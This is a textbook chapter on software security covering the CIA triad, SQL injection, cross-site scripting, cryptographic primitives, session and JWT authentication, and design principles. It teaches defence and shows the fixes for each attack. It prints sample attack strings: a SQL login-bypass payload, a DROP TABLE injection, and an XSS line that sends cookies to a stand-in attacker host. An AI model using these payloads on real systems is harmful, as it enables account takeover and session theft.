---
title: Security and Authentication
layout: sebook
---

<script src="/js/ArchUML/uml-bundle.js"></script>

# Background and Motivation

## Why Security Matters

Security is not a *feature*; it is a property of the entire system, and one that is far easier to lose than to retrofit. Two recent industry numbers make the case concrete: cyberattacks against organizations grew sharply year over year in 2024, and the average cost of a single data breach now sits around \\$4.4 million per incident (IBM's 2024 *Cost of a Data Breach* report). A breach is rarely just an embarrassing news cycle — it is also legal exposure, regulatory fines, customer churn, mandatory remediation, and, sometimes, the end of the company.

The discipline that keeps these failures out is **security engineering**. This chapter introduces the smallest set of ideas a software engineer needs to reason about whether an application *is* secure and what *kind* of failure it is when it isn't: the **CIA triad**, the two most common web vulnerabilities (**SQL injection** and **cross-site scripting**), the **cryptographic primitives** every web app eventually leans on, **authentication** mechanisms, and a handful of **design principles** that shape secure systems regardless of language or framework. We close with a four-question template — **security plan** — for evaluating any system you build or inherit.

## Two Stories That Frame the Chapter

**Hollywood Presbyterian Medical Center, 2016.** A ransomware infection encrypted the hospital's files, taking the medical-records system offline. Staff resorted to fax machines and paper charts; some patients had to be diverted to other hospitals. The attackers demanded a ransom in Bitcoin; the hospital ultimately paid 40 BTC (about \\$17,000 at the time) to restore access. *No data was stolen.* The harm was that legitimate users — doctors, nurses, the hospital itself — could no longer reach their own data and could no longer trust the data they did reach.

**Equifax, 2017.** Attackers exploited an unpatched vulnerability in Apache Struts (CVE-2017-5638) and exfiltrated the personal records of approximately 147 million Americans, including names, addresses, dates of birth, Social Security numbers, and driver's license numbers. The total cost — settlements, regulatory fines, mandatory security upgrades — eventually exceeded \\$1.38 billion. *Nothing was deleted or encrypted.* The harm was that highly sensitive data, which should never have left Equifax, was in the hands of strangers.

These two failures look superficially similar — both are "security incidents" — but they break the system in different ways, and a useful theory has to distinguish them. That theory is the **CIA triad**.

# The CIA Triad: Three Security Attributes

Almost every security failure can be classified as a violation of one (or more) of three properties. Together they are known as the **CIA triad**.

## Confidentiality

> *Sensitive data must be accessible to **authorized users only**.*

A confidentiality failure is the system letting the *wrong* person read data they should not have seen. Equifax is the textbook case: the data itself was unchanged and still available — it had simply been read by people who had no business reading it. Other examples are leaked password databases, unencrypted health records on a stolen laptop, or a misconfigured cloud bucket that anyone on the internet can list.

## Integrity

> *Sensitive data must be **modifiable by authorized users only**, and the system must keep it **accurate, consistent, and trustworthy** over its lifecycle.*

An integrity failure is the system allowing the *wrong* change to be made. The Hollywood Presbyterian ransomware was an integrity failure as well as an availability one: the files on disk had been overwritten with attacker-controlled ciphertext. A more subtle integrity failure is a bank ledger where a row's `amount` is silently mutated by an unauthorized SQL statement, or an audit log into which an attacker can write fake entries to cover their tracks.

## Availability

> *Critical services must be **available when needed** by their legitimate clients.*

An availability failure is the system being *unable to serve* requests that should succeed. Ransomware is one cause; a denial-of-service attack that floods the front door is another; a single power supply that takes the only data center offline is a third. The hospital was the textbook case here too — patient records existed, but doctors couldn't get to them.

## Why a Triad and not a Single Property

Different attacks violate different combinations of the three. Calling everything just "a security incident" obscures *what* went wrong and therefore *what defense* would have prevented it. Encryption protects confidentiality; cryptographic hashes and signatures protect integrity; redundancy and rate-limiting protect availability. You cannot pick the right defense without first identifying which property is at stake.

| Incident | Confidentiality | Integrity | Availability |
|---|---|---|---|
| Equifax 2017 (data exfiltration) | ✓ violated | — | — |
| Hollywood Presbyterian 2016 (ransomware) | — | ✓ (files overwritten) | ✓ (records inaccessible) |
| DDoS attack flooding a checkout API | — | — | ✓ |
| Stolen unencrypted laptop with PHI | ✓ | — | — |
| Forged transaction inserted into a bank ledger | — | ✓ | — |

---

**Quick Check.** Cover the table above. For each scenario, which CIA letter(s) apply, and *why*? Spaced retrieval — recalling without looking — is what builds durable memory; re-reading merely feels like it does.

---

# Common Web Vulnerabilities

Two vulnerabilities account for an outsized share of real-world web breaches: **SQL injection** and **cross-site scripting**. Both have the same underlying shape — *user-supplied data is mistakenly treated as code by some downstream interpreter* — and both are eradicated by the same conceptual fix: **separate code from data**.

## SQL Injection (SQLi)

A login handler that builds its query by string concatenation looks innocent:

```python
name = get_user_input("username")
pass = get_user_input("userpassword")
sql = ('SELECT * FROM Users '
       'WHERE Name = "' + name + '" '
       'AND Pass = "' + pass + '"')
user = db.execute_query(sql)
login(user) if user else retry()
```

For a normal login (`name = "Tobias"`, `pass = "password1234"`), the database sees:

```sql
SELECT * FROM Users WHERE Name = "Tobias" AND Pass = "password1234"
```

— and returns the matching user (if any). But the user controls the *contents* of `name` and `pass`, and through string concatenation that means the user partially controls the *query itself*. An attacker submits:

* **Username:** `Tobias`
* **Password:** `" or ""="`

…and the resulting query becomes:

```sql
SELECT * FROM Users WHERE Name = "Tobias" AND Pass = "" or ""=""
```

`""=""` is unconditionally true, so the predicate reduces to `Name = "Tobias"` — and the attacker is logged in as Tobias *without knowing the password*. With more sophisticated payloads the attacker can read other tables, modify or delete data, and (under some configurations) execute commands on the database server.

### Why SQL Injection Matters

SQL injection has been described in print for almost three decades — the first public write-up appeared in *Phrack* magazine in 1998 — and it remains one of the most common web vulnerabilities found in the wild. The OWASP Top 10 listed *injection* (a category dominated by SQLi) as the **#1 web application security risk** continuously from 2003 through 2017, and it was still in the top 3 in 2021. A non-exhaustive timeline:

* **1998** — SQL injection is first described publicly (Phrack #54, Rain Forest Puppy).
* **2003–2017** — OWASP ranks Injection as the #1 web-application security risk in every revision of its Top 10.
* **2011** — A SQL-injection-driven breach of Sony PlayStation Network compromises personal data of ~77 million users.
* **2023** — The MOVEit Transfer breach (CVE-2023-34362) — a SQLi vulnerability in a widely used file-transfer product — is exploited by the Cl0p ransomware group, affecting *thousands* of organizations and tens of millions of individuals.

If a vulnerability has been understood since 1998 and is still on every "top web vulnerabilities" list a quarter-century later, the explanation is not that the fix is hard — it is that the fix is *not the default*. Every team that hand-rolls a query is one tired afternoon away from concatenating user input into a SQL string.

### The Fix: Prepared Statements / Parameterized Queries

Almost every modern database driver supports **parameterized queries**: the developer writes the query with placeholders, and the parameter values are sent *separately*, never inlined into the SQL text:

```python
name = get_user_input("username")
pass = get_user_input("userpassword")
sql = ('SELECT * FROM Users '
       'WHERE Name = @0 '
       'AND Pass = @1')
user = db.execute_query(sql, name, pass)
login(user) if user else retry()
```

The placeholder syntax varies by driver (`?` in SQLite/MySQL, `%s` in psycopg, `@0` / `@1` in some Microsoft drivers, `$1` / `$2` in PostgreSQL's native protocol), but the *guarantee* is the same: the database parses the SQL **once, with the placeholders in place**, and then *binds* the parameter values into the already-parsed query plan. The attacker's `" or ""="` payload now ends up as a literal string compared against `Pass`, never as additional SQL syntax.

> **Don't roll your own escaping.** A common (wrong) instinct is to "fix" SQLi by manually escaping quotes — replacing `"` with `\"`, stripping semicolons, and so on. This loses to subtleties of every database's quoting rules and is one Unicode normalization trick away from being bypassed. The correct fix is to never construct SQL by string concatenation in the first place — let the database do parameter binding.

### Which CIA Properties Does SQLi Threaten?

| Attribute | How SQLi can violate it |
|---|---|
| **Confidentiality** | Read sensitive data from any table the database role can see (`SELECT * FROM Users` and beyond). |
| **Integrity** | Modify, insert, or delete data (`UPDATE Users SET role='admin' WHERE id=...`, `DROP TABLE`, planted backdoor accounts). |
| **Availability** | Less common, but possible: dropping tables, deleting rows, or running expensive queries to exhaust the database. |

The XKCD strip "Bobby Tables" — *Robert'); DROP TABLE Students;--* — captures both the integrity and availability failure mode in one panel. The `');` closes the original `INSERT` statement, `DROP TABLE Students;` removes the entire student table, and `--` comments out whatever the original query had after the value, so the database doesn't choke on a trailing syntax error.

## Cross-Site Scripting (XSS)

Suppose a social-media site renders user comments into the page like this (pseudo-HTML):

```html
<div class="comment">
  <span class="author">Paul Eggert</span>
  <span class="body">Facts</span>
</div>
```

If the site renders the comment body by **concatenating it into the HTML document**, an attacker can post a comment whose body is:

```html
<script>alert("USC IS BETTER!!!")</script>
```

When any other user's browser fetches the page, that `<script>` tag is part of the document, so the browser **executes it** — believing it came from the trusted site. The alert box is harmless theatre; the *real* danger is that the script can read the victim's cookies, session tokens, or DOM, and ship them off to an attacker-controlled server:

```html
<script>fetch("https://evil.example/steal?c=" + document.cookie)</script>
```

Because the script runs **in the trusted site's origin**, the same-origin policy is no defense — to the browser, this script is no different from one the site itself shipped. The attacker has effectively borrowed the site's identity inside every visiting user's browser.

### Two High-Profile XSS Incidents

* **2010 — Twitter's `onmouseover` worm.** Twitter's tweet-rendering pipeline failed to escape an `onmouseover=` attribute. A self-replicating tweet caused users' browsers to retweet the payload as soon as the user's pointer passed over it. The worm propagated to hundreds of thousands of accounts in a few hours and was used both for pranks (rainbow text, pop-ups) and for redirecting users to malicious third-party sites.
* **2018 — British Airways breach.** Attackers (associated with the *Magecart* group) injected a small JavaScript skimmer into the BA website. When customers entered their payment details, the script silently exfiltrated names, addresses, card numbers, and CVVs to an attacker-controlled domain. Hundreds of thousands of customers were affected; the UK Information Commissioner's Office subsequently fined BA £20 million.

### Which CIA Properties Does XSS Threaten?

| Attribute | How XSS can violate it |
|---|---|
| **Confidentiality** | Read cookies, tokens, DOM contents, or anything the user can see in the browser, and exfiltrate them. |
| **Integrity** | Modify the rendered page, submit forms in the user's name, post on their behalf, change settings. |
| **Availability** | Less common, but a runaway script can wedge or crash the user's browser tab. |

### The Fix: Sanitize / Escape and Use a CSP

Defenses come in layers:

* **Output encoding (the primary fix).** Wherever user input is rendered into HTML, *escape* the metacharacters (`<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;`, `&` → `&amp;`) so the browser sees them as text rather than as tag boundaries. Modern templating engines (React's JSX, Vue's `{{ }}`, Django templates, Jinja2 `{{ }}`) escape by default — bypassing them via `dangerouslySetInnerHTML`, `v-html`, `mark_safe`, or `{{ }}|safe` is where XSS bugs are reintroduced.
* **Content Security Policy (a defense in depth).** A `Content-Security-Policy` HTTP header tells the browser *which sources of script it will execute* — typically, only the site's own origin and a small explicit allow-list. Even if attacker-supplied `<script>` slips through escaping, a strict CSP refuses to run it.
* **Use HttpOnly cookies for session tokens.** A cookie with the `HttpOnly` flag is unreadable from JavaScript, so a successful XSS attack cannot directly *steal* the session token. (It can still abuse the session by issuing requests from the victim's browser — see the authentication section below.)

# Cryptographic Foundations

Modern security depends on a small set of cryptographic primitives. You will rarely implement them yourself — the rule is *don't roll your own crypto* — but you must understand what each one does and what it does *not* do, in order to use the libraries correctly.

## Symmetric Encryption (e.g., AES)

In **symmetric encryption**, the *same* secret key is used to both encrypt and decrypt. Plaintext + key → ciphertext; ciphertext + key → plaintext. The most widely used algorithm today is **AES** (Advanced Encryption Standard), with 128-, 192-, or 256-bit keys.

Symmetric ciphers are fast and well-suited to bulk data — disk encryption, file encryption, the data channel of TLS sessions. Their fatal limitation is the **key-distribution problem**: the sender and receiver must somehow agree on the secret key without an attacker overhearing them. If they could already have a private channel for that, they would not need encryption.

## Public-Key (Asymmetric) Cryptography (e.g., RSA)

**Public-key cryptography** solves the key-distribution problem. A key generator produces a *pair* of mathematically linked keys from a large random number:

* The **public key** is published — anyone may have it.
* The **private key** is kept secret by the owner — and *only* by the owner.

A message encrypted with one key of the pair can only be decrypted by the *other* key of the pair. From this single asymmetry, two crucial protocols fall out: **encryption to a recipient** and **digital signatures**.

### Encrypting a Message to Bob

To send Bob a private message, Alice encrypts it with **Bob's public key**. Anyone can do that — the public key is, well, public. But only Bob's *private* key can decrypt the resulting ciphertext, so only Bob can read the message. No prior shared secret is required.

### Digital Signatures

The reverse direction is just as useful. If Alice encrypts a document with her **own private key**, anyone can decrypt it (with her public key) — so the document is *not* secret. But because *only Alice* has her private key, the fact that the document decrypts cleanly with her public key proves *she* must have produced it. That proof is what a **digital signature** is.

In practice nobody encrypts the entire document — that would be slow and wasteful, since the goal is authenticity rather than secrecy. Instead, the signer:

1. Computes a **cryptographic hash** of the document (a short, fixed-length, collision-resistant fingerprint — SHA-256, for example).
2. Encrypts the *hash* with her private key. That encrypted hash is the signature.

Verification reverses the steps: anyone with the document, the signature, and the signer's public key can decrypt the signature, recompute the hash from the document, and check that the two hashes match. If they do, the document has not been altered *and* it really came from the holder of the matching private key.

> **Why hash before signing?** Public-key operations are roughly three orders of magnitude slower than hashing per byte, so signing a 1 MB document directly would be slow. Hashing first reduces every document to a 32-byte digest; the public-key operation then runs over those 32 bytes regardless of original document size. As a bonus, the hash's collision-resistance means an attacker cannot forge a different document with the same signature.

# Authentication

**Authentication** is the act of proving to a server that a request comes from a particular identified user. It looks deceptively trivial — "the user logs in, then makes requests" — but the question of *what proof* the client attaches to *each subsequent request* is where the design choices live. The naive answer is wrong; the better answers come with their own trade-offs.

## Naive Approach: Send the Password Every Request

> *Don't do this.*

The most direct design is for the client to attach the username and password to *every* request, and the server to verify them every time:

<pre><code class="language-uml-sequence">@startuml
participant Client
participant Server

Client -> Server : Username, Password
Server --> Client : OK

Client -> Server : Request, Username, Password
Server --> Client : Reply

Client -> Server : Request, Username, Password
Server --> Client : Reply
@enduml</code></pre>

This works, but it is bad on two counts:

* **Slow.** The server must verify the password (a deliberately slow hash like bcrypt or Argon2) on *every* request — adding tens of milliseconds of CPU per call.
* **Insecure.** The client must keep the cleartext password in memory for the lifetime of the session, raising the blast radius of any client-side compromise. Every request is also a fresh chance for the password to leak in a log file, a proxy header, or a debug trace.

We need a way to **prove identity without re-sending the password** every time.

## Session-Based Authentication (Session Cookies)

The standard fix is to authenticate *once* with username and password, and then issue the client a short-lived **session ID** — a random, opaque string that the server remembers alongside *which user* it represents.

<pre><code class="language-uml-sequence">@startuml
participant Client
participant Server

Client -> Server : Username, Password
Server --> Client : Set-Cookie: SessionID

Client -> Server : Request + Cookie(SessionID)
Server --> Client : Reply

Client -> Server : Request + Cookie(SessionID)
Server --> Client : Reply
@enduml</code></pre>

The session ID is stored client-side in a **cookie** that the browser automatically attaches to every subsequent request to the same domain. On each request, the server looks up the session ID in its own session store, finds the associated user, and serves the request as that user.

**Important cookie flags.** Three attributes harden a session cookie significantly:

* `HttpOnly` — the cookie is *not* readable from JavaScript. A successful XSS attack therefore cannot exfiltrate the raw session ID.
* `Secure` — the cookie is only sent over HTTPS. It cannot be sniffed off plain-HTTP networks.
* `SameSite=Strict` (or `Lax`) — the cookie is not attached to cross-site requests. This is the primary defense against **cross-site request forgery (CSRF)**, where a malicious page tries to issue an authenticated request from the victim's browser.

**Trade-offs.**

* *Fast.* Looking up a session ID is much cheaper than re-verifying a password.
* *Stateful.* The server must keep a session store (in memory, in Redis, in a DB), which is a moving part to operate and a complication when scaling out.
* *Somewhat secure.* Sessions can be made short-lived and explicitly invalidated on logout.
* *Still vulnerable to session-riding via XSS.* Even with `HttpOnly`, a script running on the trusted page can issue authenticated `fetch` requests through the browser — the browser will dutifully attach the cookie. `HttpOnly` prevents *theft* of the session ID, not *use* of the session.

## Authentication via JSON Web Tokens (JWT)

A **JSON Web Token (JWT)** sidesteps the server-side session store. After successful login, the server hands the client a small encoded JSON document — typically containing `{ "sub": "<user-id>", "exp": <expiry timestamp>, ... }` — and **digitally signs it** with the server's private (or symmetric) signing key.

<pre><code class="language-uml-sequence">@startuml
participant Client
participant Server

Client -> Server : Username, Password
Server --> Client : JWT (signed)

Client -> Server : Request + JWT
Server --> Client : Reply

Client -> Server : Request + JWT
Server --> Client : Reply
@enduml</code></pre>

The client attaches the JWT to every subsequent request — typically in an `Authorization: Bearer <jwt>` header, or in a cookie. The server verifies the signature *with its own key* and trusts the claims inside without any database lookup. There is no server-side session store to consult — the JWT *is* the session, and the signature is what makes it forgery-proof.

**Trade-offs.**

* *Stateless on the server.* No session store; horizontal scaling is easier.
* *Fast.* Verifying a signature is typically faster than a database round-trip to a session table.
* *Hard to revoke before expiry.* Because the server keeps no record of "valid" tokens, a stolen JWT remains usable until its `exp` time is reached. Standard mitigations are short expiries (15 minutes is common) plus a longer-lived **refresh token** that *is* tracked server-side.
* *Same XSS exposure as session cookies, plus more.* If the JWT is stored in `localStorage` (a common, lazy choice) it is *directly* readable by any script in the page — XSS exfiltrates the token outright. Storing the JWT in an `HttpOnly` + `SameSite=Strict` cookie reduces this to roughly the session-cookie risk profile.

## Picking Between the Two

The choice is rarely a slam dunk. As a starting point:

* **Server-rendered web app, single backend, moderate scale.** Session cookies (with `HttpOnly`, `Secure`, `SameSite=Strict`). Boring, well-understood, easy to revoke.
* **Many distinct services share authentication, or you are building a public API consumed by mobile clients.** JWTs (signed, short-lived, paired with refresh tokens) work well — they don't require every service to talk to a shared session store.
* **Either way:** put the credential behind `HttpOnly` cookies if at all possible, never embed it in URLs, and never rely on the user's browser keeping `localStorage` confidential.

# Security Design Principles

Beyond specific vulnerabilities and primitives, security engineering is shaped by a small set of *principles* that have held up across decades of practice. Three are especially load-bearing for application developers.

## Zero Trust Principle

> *Users and devices should not be trusted by default. Any input may be malicious, so every input must be sanitized.*

The traditional ("perimeter") model assumed that anything *inside* the corporate network was trustworthy and only outside traffic needed scrutiny. That assumption fails against insider threats, compromised internal hosts, supply-chain attacks, and the simple fact that modern apps span multiple networks. **Zero Trust** flips it: every request, no matter where it originates, is authenticated and authorized; every input, no matter where it comes from, is treated as potentially hostile until validated.

For an application developer, the operational consequence is that the **trust boundary** — the line between "I have to defend against this" and "I can rely on this" — should be drawn very tightly. Inputs from end users, third-party APIs, file uploads, configuration files, and even other internal services should all be validated at the boundary they cross into your code.

## Open Design (vs. Security Through Obscurity)

> *Attackers should not be able to break into a system simply by understanding how it works. Use robust, public security mechanisms.*

**Security through obscurity** is the temptation to keep a system secure by hiding *how* it works — a hidden URL, a custom-rolled hash, an unpublished port. The metaphor in the lecture is hiding the house key in a flowerpot: as soon as someone notices the flowerpot, the entire defense collapses.

The opposing principle is **Open Design**: the security of the system must rest on something that stays secret even when the *design* is public — typically a key, a password, or a private credential. AES, RSA, and TLS are all openly published; their security depends on key secrecy, not algorithm secrecy. This openness is a *feature* — the global security community has reviewed, attacked, and stress-tested these designs for decades, and weaknesses have been found and fixed publicly.

> **Obscurity is not useless — it is just not a foundation.** Hiding implementation details (which version of which framework you run, which port management endpoints listen on) is a reasonable *complementary* layer that makes known vulnerabilities slower to find. Use it on top of strong, openly designed mechanisms — never instead of them. The rule of thumb:
>
> * **When proposing a new security approach or algorithm:** insist on *public scrutiny* — expose the design to the security community.
> * **When deploying an existing, scrutinized technology in a real product:** add *complementary obscurity* on top — hide your version numbers and configuration to slow down opportunistic attackers.

## Principle of Least Privilege

> *Every program and every privileged user of the system should operate using the **least set of privileges necessary** to complete the job.*

Originally formulated by Saltzer and Schroeder in 1975, the **Principle of Least Privilege** (sometimes called Least Authority or Minimal Privilege) is a strategy for shrinking the **blast radius** of an inevitable compromise. If every component runs with full permissions, the first foothold an attacker gets is also the last one they need; if every component runs with only what it requires, the foothold is contained.

A concrete application is to split a monolithic app into separate components, each with **just** the permissions it needs:

<pre><code class="language-uml-component">@startuml
component ProductDisplay
component EmailNotification
component ImageUpload
component SystemBackup

note bottom of ProductDisplay
  Read-only access to
  Products table
end note

note bottom of EmailNotification
  Send-only access to
  email API; no DB access
end note

note bottom of ImageUpload
  Write-only access to
  /uploads bucket; no delete
end note

note bottom of SystemBackup
  Read-only access to FS/DB;
  write only to backup bucket
end note
@enduml</code></pre>

If an attacker compromises the **product display** service, they cannot send phishing email to the user base, cannot upload arbitrary files, and cannot exfiltrate the entire database — those capabilities live in *other* processes with *other* credentials. The attack still hurts, but it does not become a company-ending event.

Cloud IAM systems (AWS IAM, GCP IAM, Kubernetes RBAC) are designed around this principle: every service, container, or human user gets a role that grants the *narrowest* set of capabilities that lets the role do its job. The opposite anti-pattern — running every service as the database owner with full network egress — is one of the single most common findings in real security audits.

# Building a Security Plan

Knowing individual attacks and defenses is necessary but not sufficient. To reason about a *whole system*, security engineers use a four-question template. Walk through these for any system you build or inherit.

| # | Question | What you produce |
|---|---|---|
| 1 | **Security model.** *What are you defending?* | A list of the assets that matter — data, services, secrets, reputation. |
| 2 | **Threat model.** *Who might be attacking, and what are they trying to achieve?* | A description of plausible adversaries and their goals. |
| 3 | **Attack surface.** *Which parts of the system are exposed to an attacker?* | An inventory of the inputs, endpoints, ports, and side channels an attacker can reach. |
| 4 | **Protection mechanisms.** *How do we prevent (or detect) compromise?* | The concrete defenses — input validation, encryption, authentication, monitoring — and which threats they address. |

## Building a Threat Model: Knowledge, Actions, Resources, Incentive

A threat model is not "attackers are bad and want bad things". It is a structured description of *what kind* of attacker you are defending against. The lecture distinguishes four dimensions:

* **Knowledge.** What does the attacker already know about the system? (Public docs only? Stolen source code? An insider with credentials?)
* **Actions.** What can the attacker actually *do*? (Send web requests? Run code on a guest VM? Tap the network? Bribe an employee?)
* **Resources.** How much time, money, and infrastructure can they spend? (A bored teenager? A criminal cartel? A nation-state intelligence service?)
* **Incentive.** *Why* do they want to compromise the system? (Financial gain? Ideological? Espionage? Vandalism?)

Different threat models warrant different defenses. A consumer mobile app and a defense contractor's internal collaboration tool may use the same primitives (TLS, authentication, encryption at rest), but the *strength* and *layering* of those primitives — and the response cost they justify — differ by orders of magnitude.

## Why a Wrong Threat Model Hurts

A widely circulated photograph shows an emergency telephone whose buttons are blocked by an aluminum foil cover with cutouts for "9" and "1" — meant to enforce *"only 9-1-1 can be dialed"*. Two things are wrong with the design:

* **Wrong threat model.** Any phone number that contains only the digits 9 and 1 (e.g. `911-1119`) can still be dialed. The cover assumed attackers would only press one digit at a time.
* **Larger-than-expected attack surface.** The foil itself can be pushed sideways or torn, exposing the buttons underneath.

The lesson generalizes: a defense that doesn't *match the actual threat model* and doesn't account for the *real attack surface* fails for both reasons. Always do the four-question pass on the *system as deployed*, not the system as drawn on the whiteboard.

---

**Quick Check.** Pick a real application you use daily. Walk through the four questions: what is it defending, who attacks it, what is exposed, what defenses are in place? Where are the weakest links?

---

# Summary

* The **CIA triad** classifies security goals into three properties: **Confidentiality** (only authorized users can read), **Integrity** (only authorized users can modify), and **Availability** (the system serves legitimate clients when needed). Every breach is a violation of one or more of these.
* **SQL injection (SQLi)** treats user-supplied strings as SQL code by string-concatenating them into queries. The fix is **prepared statements / parameterized queries**, which let the database parse the SQL once and bind values separately. Don't roll your own escaping.
* **Cross-site scripting (XSS)** treats user-supplied strings as HTML/JavaScript by interpolating them into pages. The fix is **output encoding** in the templating layer, defended in depth by a strict **Content Security Policy** and `HttpOnly` cookies for session credentials.
* **Symmetric encryption (AES)** uses one shared key — fast, but suffers from the key-distribution problem. **Public-key cryptography (RSA)** uses a public/private key pair, enabling private messaging *and* digital signatures without prior shared secrets. **Digital signatures** are produced by encrypting the *hash* of a document with the signer's private key.
* **Authentication** must avoid sending the password on every request. **Session cookies** delegate to a server-side store and need `HttpOnly` + `Secure` + `SameSite`. **JWTs** are signed, stateless tokens — easier to scale across services, harder to revoke, and dangerous if stored in `localStorage` (XSS readable).
* Three security design principles dominate application code: **Zero Trust** (validate every input, regardless of source), **Open Design** (security rests on key secrecy, not algorithm secrecy — public scrutiny improves designs), and **Principle of Least Privilege** (every component holds only the permissions its job requires, shrinking the blast radius of any compromise).
* A **security plan** answers four questions: what are you defending (security model), who is attacking and why (threat model), where is the system exposed (attack surface), and what mechanisms prevent compromise (protection mechanisms). A defense built without a matching threat model fails — the foil-and-emergency-phone is the canonical illustration.

---

# Further Reading and Practice

## Further Reading

* **Jerome H. Saltzer and Michael D. Schroeder.** *The Protection of Information in Computer Systems.* Proceedings of the IEEE, 63(9), 1278–1308, 1975. — *The original statement of the Principle of Least Privilege, Open Design, and the other classical security design principles. Still essential reading.*
* **Ross Anderson.** *Security Engineering: A Guide to Building Dependable Distributed Systems.* 3rd edition, Wiley, 2020. (Free PDF at <https://www.cl.cam.ac.uk/~rja14/book.html>.) — *The standard graduate-level textbook on real-world security engineering; rich case studies across banking, healthcare, telecoms.*
* **OWASP.** *OWASP Top 10 — Web Application Security Risks.* <https://owasp.org/www-project-top-ten/> — *Industry-standard list of the most common web vulnerabilities, updated every few years.*
* **OWASP.** *Cheat Sheet Series.* <https://cheatsheetseries.owasp.org/> — *Concrete, language-specific guidance for SQLi, XSS, CSRF, authentication, and many more.*
* **Mozilla Web Security Cheat Sheet.** <https://infosec.mozilla.org/guidelines/web_security> — *Practical defaults for HTTPS, headers, CSP, and cookie attributes.*
* **NIST Special Publication 800-63B.** *Digital Identity Guidelines: Authentication and Lifecycle Management.* <https://pages.nist.gov/800-63-3/sp800-63b.html> — *The current authoritative guidance on password rules, MFA, and session management.*
* **Rain Forest Puppy.** *NT Web Technology Vulnerabilities.* Phrack Magazine, vol. 8 issue 54, 1998. — *The first widely circulated public description of SQL injection.*

## Reflection Questions

1. For each of the three CIA attributes, describe one *plausible* violation that would be problematic for a course-project system you have built or worked on. Which CIA attribute is hardest to defend in your project, and why?
2. A teammate proposes "we'll just sanitize SQL inputs by replacing single quotes with two single quotes". Explain why this is a strictly worse defense than parameterized queries.
3. Explain in one paragraph why an `HttpOnly` flag on a session cookie does *not* fully neutralize XSS. What additional class of attack remains possible?
4. You are designing a small e-commerce service composed of four backend components: a product catalog, a checkout flow, a notifications service, and a nightly batch report. Apply the Principle of Least Privilege: what database, file-system, and outbound-network permissions does each component need — and which should it *not* have?
5. Walk through the four security-plan questions (security model, threat model, attack surface, protection mechanisms) for a hypothetical UCLA student-grades portal. What threat model warrants the strongest defenses, and why?
6. *Open Design* says cryptographic algorithms should be public. *Complementary obscurity* says you should hide your framework versions and config. These sound contradictory. In one paragraph, reconcile them.

## Practice

{% include flashcards.html id="security" %}

{% include quiz.html id="security" %}

*Pedagogical tip: After reading this chapter, try to **explain** each concept aloud — to a study partner, a rubber duck, or your imaginary future self — before peeking at the answer. Effortful retrieval builds durable mental models; re-reading merely feels productive.*
